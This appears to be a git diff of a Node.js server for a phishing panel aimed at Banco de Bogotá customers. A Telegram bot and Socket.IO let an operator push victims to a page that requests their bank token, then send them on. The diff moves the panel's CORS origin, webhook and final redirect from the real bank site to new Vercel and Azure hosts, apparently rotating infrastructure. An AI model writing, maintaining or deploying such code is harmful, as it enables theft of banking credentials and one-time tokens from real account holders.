@@ -12,7 +12,7 @@ const chatId = process.env.TELEGRAM_CHAT_ID;
 const io = new Server({
     cors: {
         origin: process.env.VERCEL === '1' 
-            ? 'https://panel-de-bogota.vercel.app' 
+            ? 'https://bog-panel.vercel.app' 
             : '*',
         methods: ["GET", "POST"],
         credentials: true
@@ -39,7 +39,7 @@ app.use((req, res, next) => {
 async function setupBot() {
     try {
         if (process.env.VERCEL === '1') {
-            const webhookUrl = 'https://panel-de-bogota.vercel.app/api/webhook';
+            const webhookUrl = 'https://bog-panel.vercel.app/api/webhook';
             await bot.setWebHook(webhookUrl);
             console.log('Webhook configurado:', webhookUrl);
         } else {
@@ -81,7 +81,7 @@ io.on('connection', (socket) => {
                     redirectUrl = '/token.html?action=pedir_token';
                     break;
                 case 'finalizar':
-                    redirectUrl = 'https://virtual.bancodebogota.co/';
+                    redirectUrl = 'https://bog-panel-a7g7fqcgftfscrcv.centralus-01.azurewebsites.net/';
                     message = 'Proceso finalizado exitosamente';
                     await bot.editMessageText('✅ Proceso finalizado exitosamente', {
                         chat_id: chatId,
